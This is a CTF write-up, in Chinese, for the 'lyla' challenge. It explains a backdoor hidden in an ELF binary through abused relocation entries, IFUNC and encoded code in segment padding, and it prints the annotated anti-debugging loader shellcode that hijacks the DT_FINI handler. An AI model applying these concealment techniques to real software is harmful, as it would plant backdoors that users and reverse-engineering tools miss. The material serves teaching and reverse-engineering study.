## lyla

解题脚本见 solve.py。

题目表面上的逻辑是一个无解题：经典的“输入密码，检查密码是否正确，正确则读取并输出 flag 文件内容”。但验证逻辑为“固定 32 字节的输入，使用输入作为 key 运行 Speck (128/128) 加密算法，要求结果等于另一固定值”，该验证逻辑在该密码算法不被攻破的情况下是不可能被解出的。

程序里藏有常见逆向工具（测试了 IDA Pro、objdump、readelf、Ghidra）不会直接显示的后门，后门主体代码编码后放置在 .text section 所属的 segment 结尾的填充数据中，ELF 头不会将这段数据标记为需要加载，但 Linux 实际映射文件内容进内存的时候是按页对齐的，是可以访问到的。后门代码的解码和触发逻辑藏在了重定位表里，重定位表的结构这里不再赘述，感兴趣的同学可以自行翻阅 glibc 源码中的 `glibc/sysdeps/x86_64/dl-machine.h`。

本题利用了以下几个重定位类型：

* `R_X86_64_SIZE64` - 指定 symbol index = 0，则该重定位项的实际效果为写 `*(uint64_t*)(elf_base+addr) = (addend+0);`
* `R_X86_64_COPY` - 记指定 symbol 解析出来的地址为 symbol_value，则实际效果为 `memcpy(elf_base+addr, symbol_value, symbol_size);`
* `R_X86_64_RELATIVE` - `*(uint64_t*)(elf_base+addr) = (elf_base+addend);`
* `R_X86_64_64` - 记指定 symbol 解析出来的地址为 symbol_value，则实际效果为 `*(uint64_t*)(elf_base+addr) = (symbol_value + addend);`

此外我们还利用了 IFUNC 机制，将符号类型设置为 `STT_GNU_IFUNC` 后，ld.so 在解析该符号时会将原本解析出来的值当作函数指针调用，并将函数返回值作为解析出来的符号值。这可以用来触发 shellcode 执行。

ld.so 在加载 ELF 的时候支持处理两个重定位表，分别由 DT_RELA 和 DT_JMPREL 指定，分别指向 .rela.dyn 和 .rela.plt 两个节，处理顺序为先 DT_RELA 再 DT_JMPREL。虽然在 ELF 格式规范中定义 DT_JMPREL 只能包含 JUMPSLOT 等少数几种重定位项，但 ld.so 在处理时并未人为做出限制，而是使用了一样的完整 `dl_machine`。
为了让包含后门的重定位表不显得过于显眼，我们并没有选择将触发后门的重定位表项直接插入原始的重定位表中，而是利用 RELA 和 JMPREL 在内存中紧密相接这一点，修改 DT_RELASZ，将其设置为 DT_RELASZ + DT_PLTRELSZ - 1 [1]，使得 .rela.plt 节中的内容会被解析两次，并在 .rela.dyn 中加入了五项作为第一阶段，其中四个 `R_X86_64_RELATIVE` 首先修改了 ELF 符号表中 `_ITM_registerTMCloneTable` 的类型为绝对符号，然后将其值覆盖为 .rela.plt 节的地址。接下来触发 `R_X86_64_COPY` 将位于首个 ELF Segment 结尾的数据拷贝到 .rela.plt 节中。ld.so 在接下来处理 JMPREL 时即会运行我们触发后门的重定位表项。
后门重定位表项的最后使用同样的方法将备份的原始 .rela.plt 内容复制了回去。这样在第二次执行处理 JMPREL 时将可以正常处理原始 JMPREL 中的重定位项。

我们加入的重定位项逻辑如下：

1. 获取 ELF .dynamic 节中的 DT_DEBUG 指针，该指针指向一个 `_r_debug` 结构体，其中包含了一个指向 `link_map` 结构体的指针，该结构体包含了 ELF 的基地址、大小、符号表及所有的 dynamic tag 的值。
2. 计算出 link_map + 64 + 13 * 8 的地址保存至 .text 结尾处备用，其中 13 为 DT_FINI 的值。该地址是 `link_map->dl_info[DT_FINI]`，其控制了 ld.so 在程序退出时调用的 fini 函数地址。
3. 解析 `_dl_argv` 变量和 `time` 函数的值备用。
4. 在 .text 段结尾处写入一段 shellcode 并利用 IFUNC 机制运行。

注释后的 shellcode 内容如下：

```asm
_begin:
    push rbx
    lea rbx, [rip+_begin-8]
    mov rdi, [rbx-16] /* &_dl_argv */

    // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
    mov rax, [rdi]
    test eax, eax
    jz bye
    cmp byte ptr [rax], '/'
    jnz bye

    // Optimized (for size) loop for skipping argv
    movqq rcx, rdi
    xor eax, eax
    repnz scasq

    // Check for environment variable "LINES", "COLUMNS", "LD_PRELOAD" and "LD_AUDIT".
    // To make it tight we use an approximation: just check the first 4 characters.
    movqq rsi, rdi
env_check_loop:
    lodsq
    test eax, eax
    jz env_check_okay
    mov eax, dword ptr [rax]
    ror eax, 1
    cmp eax, 0xaaa627a1 /* "COLU" */
    jz bye
    // hex(ror(u32(b"LD_P"), 1, 32) & 0xffff). there might be false positive but
    // we don't care as long as there aren't in prod.
    cmp ax, 0xa226
    jz bye
    jmp env_check_loop

env_check_okay:
    // Overwrite dl_info[DT_FINI] in link_map
    mov rdi, [rbx-8]
    mov rax, [rbx]
    stosq

    // Decode payload
    movqq rcx, PAYLOAD_SIZE_IN_WORDS
    lea rdi, [rbx+(_end-_begin)+8+8]
    xor eax, eax
decode_loop:
    xor [rdi+rcx*4], eax
    add eax, [rdi+rcx*4]
    loop decode_loop

    // Patch payload to only run at correct time.
    lea rdi, [rdi+PAYLOAD_TIME_IMM_OFFSET]
    call [rbx+(_end-_begin)+8]
bye:
    // Zeroing self
    movqq rdi, rbx
    pop rbx
    push _fin-_begin+24
    pop rcx
    xor eax, eax
    rep stosb
    _fin:
    ret
_end:
```

其首先进行了一些反调试工作，检查 `argv[0]` 是否以 `'/'` 开头，检查环境变量中是否包含 `COLUMNS` （gdb 会设置该环境变量） 和 `LD_PRELOAD`，都通过后会将 `link_map->dl_info[DT_FINI]` 的值覆盖为这段 shellcode 结尾处的地址，并解码其内容，然后将 `time()` 的返回值保存到指定偏移，最后将自身内容清零。通过控制文件中的内容布局，我们在 shellcode 结尾处布置了另一段编码后的 shellcode，这样它会在程序退出时被执行。

另一段 shellcode 则是实际的后门代码，其会首先检查此时 `time()` 的返回值和程序开始时保存的值是否正好相差 3（即此时是否处于运行开始后的 3~4 秒之间），程序里读入的密码 buffer + 255 字节偏移处是否非 0，若都是，则在程序里面读入的密码 + 128 字节偏移处的 16 字节上以硬编码的密钥运行 Speck (128/128)，并检查结果是否为另一硬编码的值。若满足条件，则将密码 buffer 通过 mprotect 设置为可执行并运行。

逆向清楚后门的逻辑后，获取 flag 就比较简单了，我们只需要使用 Speck (128/128) 解密触发后门所需的数据，将其和 /bin/sh shellcode 按照上述格式拼接好，链接到远程服务器，在三秒后发送，即可获得 shell。获得 shell 后直接 `cat flag.txt` 即可。

[1] 减一的原因是 ld.so 里特别检查了 JMPREL 完全是 RELA 的一部分的情况，在这种情况下会跳过第二次执行。
